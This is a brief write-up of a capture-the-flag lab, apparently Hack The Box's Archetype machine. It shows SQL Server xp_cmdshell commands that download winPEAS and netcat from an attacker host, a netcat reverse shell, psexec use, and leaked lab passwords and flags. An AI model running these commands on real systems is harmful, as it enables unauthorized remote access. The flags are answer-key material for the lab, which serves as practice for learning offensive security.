# ArcheType Lab

export ip=10.129.95.187

# Exploit

Using smbclient to connect we get prod.dtsConfig file, this file contains an password

passwd=M3g4c0rp123
User Id= ARCHETYPE

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.41/winpeas -outfile winpeas"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.41/nc.exe -outfile nc.exe"

xmp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.15.41 9999"

and after this, we did run the winpeas and he founds the admin password

python3 psexec.py administrator@$ip

# FLAGS
admin pass = MEGACORP_4dm1n!!

user flag = 3e7b102e78218e935bf3f4951fec21a3
root flag = b91ccec3305e98240082d4474b848528
